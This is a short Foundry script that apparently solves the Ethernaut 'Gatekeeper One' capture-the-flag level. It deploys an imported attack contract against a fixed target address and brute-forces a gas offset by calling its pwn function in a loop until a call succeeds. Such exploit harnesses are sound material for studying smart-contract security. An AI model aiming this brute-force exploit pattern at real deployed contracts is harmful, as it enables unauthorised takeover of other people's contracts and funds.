import {Script, console} from "forge-std/Script.sol";
import "./attacks/13_GatekeeperOneAttack.sol";

contract GatekeeperOneScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address gatekeeperOne = 0x170588Abd3037d546875A6051880f0385f50B6A3;
        GatekeeperOneAttack gatekeeperOneAttack = new GatekeeperOneAttack(gatekeeperOne);

        for (uint256 i = 500; i < 8191 * 3; i++) {
            try gatekeeperOneAttack.pwn{gas: 3_000_000}(i) {
                console.log("Success with gas offset:", i);
                break;
            } catch {}
        }

        vm.stopBroadcast();
    }
}
